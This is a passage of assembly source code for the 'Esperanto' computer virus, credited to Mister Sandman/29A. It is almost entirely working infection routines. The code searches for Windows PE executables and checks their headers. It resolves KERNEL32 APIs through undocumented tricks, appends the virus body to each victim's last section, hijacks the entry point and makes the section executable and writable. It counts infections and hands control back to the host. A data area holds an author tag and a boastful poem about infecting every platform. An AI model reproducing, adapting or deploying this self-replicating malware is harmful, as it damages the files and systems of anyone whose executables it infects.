                ; go look for more files to infect

                mov     ecx,espo_file_size
                lea     esi,dword ptr [ebp+espo_start]
                pop     edi
                add     edi,ebx
                rep     movsb
                jmp     unmap_n_close

                ; Check if the new EXE file is a PE, by
                ; first comparing the starting doubleword
                ; of the new header with "PE"

; ÄÄ´ PE files check routine (I) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

check32_pe:     mov     esi,dword ptr [ebx+MZ_lfanew]
                add     esi,ebx
                lodsd

                cmp     eax,'EP'
                jne     unmap_n_close

                ; If this is ok, now check if the file is
                ; executable and if it is not a DLL

                mov     ax,word ptr [esi+FH_Characteristics]
                test    ax,IMAGE_FILE_EXECUTABLE_IMAGE
                jz      unmap_n_close

                test    ax,IMAGE_FILE_DLL
                jnz     unmap_n_close

                ; Get number of sections of the PE file
                ; and then point the first section with EDI

                movzx   ecx,word ptr [esi+FH_NumberOfSections]
                movzx   edi,word ptr [esi+FH_SizeOfOptionalHeader]
                add     esi,IMAGE_SIZEOF_FILE_HEADER
                add     edi,esi

s_img_section:  mov     eax,dword ptr [esi+OH_DataDirectory\
                                          .DE_Import\
                                          .DD_VirtualAddress]
                mov     edx,dword ptr [edi+SH_VirtualAddress]
                sub     eax,edx

                ; Now we're looking for the section in which
                ; the import table is found. This is usually
                ; the .idata section, but we make sure by
                ; means of checking if the address of the
                ; imports directory is inside this section

                cmp     eax,dword ptr [edi+SH_VirtualSize]
                jb      section_ok

                ; In case it's not, we point to the header
                ; of the next section with EDI, and keep on
                ; doing the same until we find it

                add     edi,IMAGE_SIZEOF_SECTION_HEADER
                loop    s_img_section
                jmp     unmap_n_close

                ; Now get a pointer to the first import
                ; module descriptor in EAX so we may
                ; look for KERNEL32.DLL thru this array

section_ok:     add     eax,dword ptr [edi+SH_PointerToRawData]
                sub     edx,eax
                add     eax,ebx

                ; Get the RVA of the Import Module
                ; Descriptor in ESI and later check
                ; if it actually exists or not (=0)

next_imd_img:   mov     esi,dword ptr [eax+ID_Name]
                lea     edi,dword ptr [ebp+offset kernel32_n]
                or      esi,esi
                jz      unmap_n_close

                ; Now get the address of the name of
                ; the IMD and check if it's the one
                ; we're looking for (KERNEL32.DLL)

                push    eax
                mov     ecx,8
                sub     esi,edx
                add     esi,ebx

                ; Get a character from ESI, check its case,
                ; convert it if necessary to uppercase and
                ; then compare the strings pointed by ESI
                ; and EDI, to see if we find KERNEL32.DLL

dll_loop:       lodsb
                cmp     al,'a'
                jb      check_char

                sub     al,('a'-'A')
check_char:     scasb
                jne     more_imd_img
                loop    dll_loop

                ; Save the ID_ForwarderChain pointer in the
                ; dynamic variable which corresponds to the
                ; KERNEL32.DLL RVA, as we will need it to
                ; find the base address of this module if
                ; the calling process to GetModuleHandleA
                ; was not successful (this is undocumented)

                pop     edi
                lea     eax,dword ptr [edi+ID_ForwarderChain]
                sub     eax,ebx
                add     eax,edx
                mov     dword ptr [ebp+kernel32_rva],eax

                ; Get the time/date stamp of KERNEL32.DLL
                ; into EAX in order to compare it with the
                ; corresponding stamp of the file we're
                ; about to infect, as we don't want to hit
                ; any binded executable PE file

                mov     eax,dword ptr [ebp+kernel32_a]
                mov     esi,dword ptr [eax+IMAGE_DOS_HEADER.MZ_lfanew]
                add     esi,eax
                add     esi,NT_FileHeader.FH_TimeDateStamp
                lodsd

                ; Determine if file is binded. If not, jump
                ; and go find the RVA of the APIs needed in
                ; the working process of Esperanto

                mov     esi,dword ptr [edi+ID_FirstThunk]
                sub     esi,edx
                add     esi,ebx
                cmp     eax,dword ptr [edi+ID_TimeDateStamp]
                jne     find_rvas

; ÄÄ´ File searching routine (FindNextFileA-based) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                ; Memory unmap file handled in EBX, check
                ; the infection counter and, if everything
                ; is ok, look for more files to infect

unmap_n_close:  call    unmap_close
find_next:      cmp     byte ptr [ebp+inf_counter],3
                je      jump_to_host

                lea     eax,dword ptr [ebp+finddata]
                push    eax
                push    dword ptr [ebp+srchandle]
                lea     eax,dword ptr [ebp+findnext_a]
                call    dword ptr [eax]
                or      eax,eax
                jnz     check_victim

                ; Nothing else to do, close the search
                ; handle and jump to the original entry
                ; point of the code of our host

                push    dword ptr [ebp+srchandle]
                lea     eax,dword ptr [ebp+findclose_a]
                call    dword ptr [eax]
jump_to_host:   popad
                ret

; ÄÄ´ PE files check routine (II) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                ; Go to next imported module descriptor

more_imd_img:   pop     eax
                add     eax,IMAGE_SIZEOF_IMPORT_DESCRIPTOR
                jmp     next_imd_img

                ; Now let's go for GetModuleHandleA. We
                ; need the RVA of this API because it is
                ; necessary to call it in order to know
                ; the base address of KERNEL32.DLL

find_rvas:      push    esi
                lea     edi,dword ptr [ebp+gmhandle_n]
                call    look4name
                mov     dword ptr [ebp+gmhandle_rva],eax

                ; Our next and last objective is the API
                ; GetProcAddress, which helps us in order
                ; to find the address of any API we look
                ; for of a given module or library

                pop     esi
                lea     edi,dword ptr [ebp+gpaddress_n]
                call    look4name
                mov     dword ptr [ebp+gpaddress_rva],eax

; ÄÄ´ PE files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                ; Increment infection counter and remap our
                ; victim in memory with the virus size added

infect32_pe:    inc     byte ptr [ebp+inf_counter]
                call    unmap_close
                add     dword ptr [ebp+finddata+WFD_nFileSizeLow],\
                                                espo_file_size
                call    open_map_file
                or      ebx,ebx
                jz      no_good

                cld
                mov     esi,dword ptr [ebx+MZ_lfanew]
                add     esi,ebx
                lodsd

                ; Get the RVA of the last section header in
                ; EDI. Here's where we're going to copy our
                ; code, so no new sections are needed and
                ; we're not so easily discovered in a file

                mov     eax,IMAGE_SIZEOF_SECTION_HEADER
                movzx   ecx,word ptr [esi+FH_NumberOfSections]
                dec     ecx
                mul     ecx

                movzx   edx,word ptr [esi+FH_SizeOfOptionalHeader]
                add     eax,edx
                add     esi,IMAGE_SIZEOF_FILE_HEADER
                add     eax,esi
                mov     edi,eax

                ; Now get the old entry point and store its
                ; RVA in a dynamic variable of our code we
                ; will use in order to jump back to our host

                push    dword ptr [esi+OH_AddressOfEntryPoint]
                pop     dword ptr [ebp+entry_rva]

                ; Get original file size and store it for
                ; later use during the PE infection process

                mov     eax,dword ptr [ebp+finddata+WFD_nFileSizeLow]
                sub     eax,espo_file_size
                push    eax

                ; Calculate new entry point by means of the
                ; original file size and our memory size, and
                ; save it as the new AddressOfEntryPoint

                sub     eax,dword ptr [edi+SH_PointerToRawData]
                add     eax,dword ptr [edi+SH_VirtualAddress]
                add     eax,offset espow32_start
                mov     dword ptr [esi+OH_AddressOfEntryPoint],eax

                ; And store the RVA of the base address, not
                ; forgetting to add the dseta offset to it

                add     eax,dseta_offset
                mov     dword ptr [ebp+base_address],eax

                ; Get new size of VirtualSize

                mov     eax,dword ptr [ebp+finddata.WFD_nFileSizeLow]
                sub     eax,dword ptr [edi+SH_PointerToRawData]
                push    eax

                add     eax,(espo_mem_size-espo_file_size)
                cmp     eax,dword ptr [edi+SH_VirtualSize]
                jbe     virtsize_ok

                mov     dword ptr [edi+SH_VirtualSize],eax
virtsize_ok:    pop     eax

                ; And now the new size of SizeOfRawData

                add     eax,(espo_mem_size-espo_file_size)
                mov     ecx,dword ptr [esi+OH_FileAlignment]
                cdq
                div     ecx
                inc     eax
                mul     ecx
                mov     dword ptr [edi+SH_SizeOfRawData],eax

                ; Set section characteristics to execute, read
                ; and write access, so Esperanto will not find
                ; any problem when performing its functioning

                or      dword ptr [edi+SH_Characteristics],\
                                   IMAGE_SCN_MEM_EXECUTE or\
                                   IMAGE_SCN_MEM_READ    or\
                                   IMAGE_SCN_MEM_WRITE

                ; Update the SizeOfImage pointer

                mov     eax,dword ptr [esi+OH_SizeOfImage]
                add     eax,espo_file_size
                mov     ecx,dword ptr [esi+OH_FileAlignment]
                cdq
                div     ecx
                inc     eax
                mul     ecx
                mov     dword ptr [esi+OH_SizeOfImage],eax

                ; And finally append the virus body to the
                ; the end of the PE file we've just infected,
                ; unmap it and go look for more victims

                mov     ecx,espo_file_size
                lea     esi,dword ptr [ebp+espo_start]
                pop     edi
                add     edi,ebx
                rep     movsb
no_good:        jmp     unmap_n_close

; ÍÍ¹ Subroutines ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;
;  Note: the following subroutines are used by the Win32 module in order to
;   perform many repeated actions, such as mapping or unmapping a file, fin-
;   ding RVAs or the base address of a given module or API, and so on.

; ÄÄ´ Undocumented way to find the address of K32 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;  Entry:
;     ş EBX => base address of host
;     ş Necessity to find KERNEL32.DLL
;
;  Exit:
;     ş EAX => base address of KERNEL32.DLL
;     ş EBX => base address of host

                ; Try to get the base address of KERNEL32
                ; by means of ID_ForwarderChain. This is
                ; an undocumented feature which only works
                ; in Windows95. First load the RVA in ESI
                ; and then add the base address to it

get_kernel32:   db      0beh
kernel32_rva    dd      ?
                add     esi,ebx
                lodsd

                ; Now check for the MZ signature

                cmp     word ptr [eax],'ZM'
                jne     k32_not_found

                ; And finally, for the PE one. If it was
                ; found, then the undocumented feature has
                ; worked. Otherwise the control will be
                ; passed to our host, as we can't execute

                mov     esi,dword ptr [eax+MZ_lfanew]
                cmp     dword ptr [esi+eax],'EP'
                je      kernel_found
k32_not_found:  popad
                ret

; ÄÄ´ Undocumented way to find the address of GetProcAddress ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;  Entry:
;     ş EBX        => base address of host
;     ş kernel32_a => base address of KERNEL32.DLL
;     ş Necessity to find GetProcAddress
;
;  Exit:
;     ş EAX        => address of GetProcAddress
;     ş EBX        => base address of host

                ; This undocumented way to get the address
                ; of the API GetProcAddress is based on
                ; looking for its name and later for its
                ; ordinal thru the array of APIs exported
                ; by the module KERNEL32.DLL. Thus, the
                ; first step consists on seeking to the
                ; base address of this library and making
                ; sure this is the right address

get_gpaddress:  cld
                push    ebx
                mov     ebx,dword ptr [ebp+kernel32_a]
                cmp     word ptr [ebx],'ZM'
                jne     gpa_aborted

                ; Once we know it has a MZ header, let's
                ; check for the PE mark, pointed by [3ch]

                mov     esi,dword ptr [ebx+IMAGE_DOS_HEADER.MZ_lfanew]
                add     esi,ebx
                lodsd

                cmp     eax,'EP'
                jne     gpa_aborted

                ; Everything ok, now let's get a pointer
                ; to the image export directory and push
                ; it onto the stack for later use

                add     esi,NT_OptionalHeader\
                           .OH_DirectoryEntries\
                           .DE_Export\
                           .DD_VirtualAddress-4
                lodsd
                add     eax,ebx
                push    eax

                ; Get also a pointer to the table of the
                ; names of exported functions and to their
                ; corresponding ordinals or addresses

                mov     ecx,dword ptr [eax+ED_NumberOfNames]
                mov     edx,dword ptr [eax+ED_AddressOfNameOrdinals]
                add     edx,ebx
                lea     esi,dword ptr [eax+ED_AddressOfNames]
                lodsd
                add     eax,ebx

                ; Now look for "GetProcAddress" thru the
                ; array of names of exported API functions

search_name:    push    ecx
                lea     esi,dword ptr [ebp+gpaddress_n]
                mov     edi,dword ptr [eax]
                or      edi,edi
                jz      next_name

                ; Compare the strings

                mov     ecx,0eh
                add     edi,ebx
                repe    cmpsb
                je      name_found

                ; Not found, go to next name

next_name:      add     eax,4
                add     edx,2
                pop     ecx
                loop    search_name

                ; In case it was not found, jump to the
                ; error routine and stop the functioning

                pop     eax
                jmp     gpa_aborted

                ; The "GetProcAddress" string was found,
                ; and EDX is the index of the function,
                ; so now we have to look for the ordinal
                ; using the mentioned index in EDX, and
                ; check if it is out of range

name_found:     pop     ecx edi
                movzx   eax,word ptr [edx]
                cmp     eax,dword ptr [edi+ED_NumberOfFunctions]
                jae     gpa_aborted

                ; This is the starting ordinal number

                sub     eax,dword ptr [edi+ED_BaseOrdinal]
                inc     eax
                shl     eax,2

                ; Finally, get address of function and jump
                ; back to the main routine, in order to look
                ; for the addresses of other needed APIs

                mov     esi,dword ptr [edi+ED_AddressOfFunctions]
                add     esi,eax
                add     esi,ebx
                lodsd
                add     eax,ebx
                pop     ebx
                jmp     gpadd_found

                ; In case there was an error, stop running
                ; and jump to the original entry point

gpa_aborted:    pop     ebx
                popad
                ret

; ÄÄ´ Map a file in memory ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;  Entry:
;     ş WFD_szFileName => file to memory-map
;
;  Exit:
;     ş EBX => handle of memory-mapped file

                ; Open existing file

open_map_file:  push    0
                push    FILE_ATTRIBUTE_NORMAL
                push    OPEN_EXISTING
                push    0
                push    0
                push    GENERIC_READ or GENERIC_WRITE
                lea     eax,dword ptr [ebp+finddata+WFD_szFileName]
                push    eax
                lea     eax,dword ptr [ebp+createfile_a]
                call    dword ptr [eax]
                or      eax,eax
                jz      exit_mapping

                ; Create file-mapping for it

                mov     dword ptr [ebp+crfhandle],eax
                push    0
                push    dword ptr [ebp+finddata+WFD_nFileSizeLow]
                push    0
                push    PAGE_READWRITE
                push    0
                push    dword ptr [ebp+crfhandle]
                lea     eax,dword ptr [ebp+cfmapping_a]
                call    dword ptr [eax]
                or      eax,eax
                jz      close_handle

                ; Map file in memory, get base address

                mov     dword ptr [ebp+maphandle],eax
                push    dword ptr [ebp+finddata+WFD_nFileSizeLow]
                push    0
                push    0
                push    FILE_MAP_WRITE
                push    dword ptr [ebp+maphandle]
                lea     eax,dword ptr [ebp+mapview_a]
                call    dword ptr [eax]
                xchg    ebx,eax
                or      ebx,ebx
                jz      close_mapping
                ret

; ÄÄ´ Unmap a file in memory ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;  Entry:
;     ş EBX => handle of memory-mapped file
;
;  Exit:
;     ş EBX => null, file unmapped

                ; Unmap view of file

unmap_close:    xchg    ebx,eax
                push    eax
                lea     eax,dword ptr [ebp+unmapview_a]
                call    dword ptr [eax]

                ; Close handle created by CreateFileMappingA

close_mapping:  push    dword ptr [ebp+maphandle]
                lea     eax,dword ptr [ebp+closehandle_a]
                call    dword ptr [eax]

                ; Close handle created by CreateFileA

close_handle:   push    dword ptr [ebp+crfhandle]
                lea     eax,dword ptr [ebp+closehandle_a]
                call    dword ptr [eax]

                ; And leave with EBX = 0

exit_mapping:   xor     ebx,ebx
                ret

; ÄÄ´ Look for the RVA of a given API by name ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;  Entry:
;     ş EDX => Section ëelta-offset
;     ş ESI => Import address table for KERNEL32.DLL
;     ş EDI => Given API name to look for
;
;  Exit:
;      EAX => RVA of the given API, or 0 if error

                ; Look for a given API (in EDI) whose RVA we
                ; are looking for by means of the structure
                ; IMAGE_IMPORT_BY_NAME, pointed by every dword
                ; in the thunk data array. First step consists
                ; on looking for its address (in ESI)

look4name:      lodsd
                or      eax,eax
                jz      inp_not_found

                ; Once found, we get a pointer to the first
                ; function name of this structure, and compare
                ; it with the name of the API we look for
                
                push    esi edi
                sub     eax,edx
                lea     esi,dword ptr [eax+ebx+2]
name_by_name:   lodsb
                or      al,al
                jz      input_found

                scasb
                je      name_by_name

                pop     edi esi
                jmp     look4name

                ; In case names match, we go and get the
                ; RVA of the function we've just found in
                ; the IAT. Otherwise we keep on searching

input_found:    pop     edi esi
                lea     eax,dword ptr [esi-4]
                sub     eax,ebx
                add     eax,edx
                ret

                ; If we couldn't find the RVA of the API,
                ; then we return with EAX equal to zero
                
inp_not_found:  xor     eax,eax
                ret

; ÍÍ¹ Data area for the Intel modules ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

text_start      label   byte
virus_author    db      '[Esperanto, by Mister Sandman/29A]',0
virus_text
 db      'Never mind your culture / Ne gravas via kulturo,',0dh,0ah
 db      'Esperanto will go beyond it / Esperanto preterpasos gxin;',0dh,0ah
 db      'never mind the differences / ne gravas la diferencoj,',0dh,0ah
 db      'Esperanto will overcome them / Esperanto superos ilin.',0dh,0ah
 db      0dh,0ah
 db      'Never mind your processor / Ne gravas via procesoro,',0dh,0ah
 db      'Esperanto will work in it / Esperanto funkcios sub gxi;',0dh,0ah
 db      'never mind your platform / Ne gravas via platformo,',0dh,0ah
 db      'Esperanto will infect it / Esperanto infektos gxin.',0dh,0ah
 db      0dh,0ah
 db      'Now not only a human language, but also a virus...',0dh,0ah
 db      'Turning impossible into possible, Esperanto.',0dh,0ah,0
text_end        label   byte

api_names       label   byte
                dd      offset createfile_n
                dd      offset cfmapping_n
                dd      offset mapview_n
                dd      offset unmapview_n
                dd      offset closehandle_n
                dd      offset findfirst_n
                dd      offset findnext_n
                dd      offset findclose_n
                dd      offset loadlibrary_n
                dd      offset glocaltime_n
api_names_end   label   byte

kernel32_n      db      'KERNEL32.DLL',0
user32_n        db      'USER32.DLL',0
gmhandle_n      db      'GetModuleHandleA',0
gpaddress_n     db      'GetProcAddress',0
messagebox_n    db      'MessageBoxA',0
createfile_n    db      'CreateFileA',0
cfmapping_n     db      'CreateFileMappingA',0
mapview_n       db      'MapViewOfFile',0
unmapview_n     db      'UnmapViewOfFile',0
closehandle_n   db      'CloseHandle',0
findfirst_n     db      'FindFirstFileA',0
findnext_n      db      'FindNextFileA',0
findclose_n     db      'FindClose',0
loadlibrary_n   db      'LoadLibraryA',0
glocaltime_n    db      'GetLocalTime',0

reloc_start     label   byte
                dw      1
                db      3
                db      4
                dw      offset newexe_ip
old_ne_cs       dw      ?
old_ne_ip       dw      ?
reloc_end       label   byte

file_flag       db      'C'
inf_timer       db      ?
inf_counter     db      ?

exe_cs          dw      0fff0h
exe_ip          dw      ?
exe_ss          dw      ?
exe_sp          dw      ?

new_com_header  db      0e9h,?,?,';',')'
old_com_header  db      0cdh,20h,90h,90h,90h

wildcard        db      '*.*',0
com_wildcard    db      '*.COM',0
exe_wildcard    db      '*.EXE',0

res_name_size   dc.b    #$4
resource_name   dc.l    #'MDEF'
rels_in_file    dc.w    #$0
resource_size   dc.w    #$espo_file_size
dist_to_res     dc.w    #$espo_file_size
espo_file_end   label   byte

include         win32api.inc
include         pe.inc
include         mz.inc

kernel32_a      dd      ?
user32_a        dd      ?
gmhandle_a      dd      ?
gpaddress_a     dd      ?

api_addresses   label   byte
createfile_a    dd      ?
cfmapping_a     dd      ?
mapview_a       dd      ?
unmapview_a     dd      ?
closehandle_a   dd      ?
findfirst_a     dd      ?
findnext_a      dd      ?
findclose_a     dd      ?
loadlibrary_a   dd      ?
glocaltime_a    dd      ?
api_addr_end    label   byte

time_table      label   byte
system_year     dw      ?
system_month    dw      ?
system_week     dw      ?
system_day      dw      ?
system_hour     dw      ?
system_minute   dw      ?
system_second   dw      ?
system_milsec   dw      ?
time_table_end  label   byte

crfhandle       dd      ?
maphandle       dd      ?
srchandle       dd      ?
max_path_size   db      ?
finddata        db      SIZEOF_WIN32_FIND_DATA dup (?)

winexe_data     label   byte
winexe_offset   dw      ?
align_shift     db      ?
newexe_size     dw      ?
last_newexe     dw      ?
lseek_newexe    dw      ?
lseek_add       dw      ?

stupid_face     db      ''        ; Ain't it charming? :)

file_or_mem     db      'F'
file_offset     dw      ?
dot_xy          dw      ?
rawdata_ptr     dd      ?
thunk_offset    dd      ?
filename        db      4ch dup (?)

old_exe_header  db      1000h dup (?)
espo_mem_end    label   byte
                end
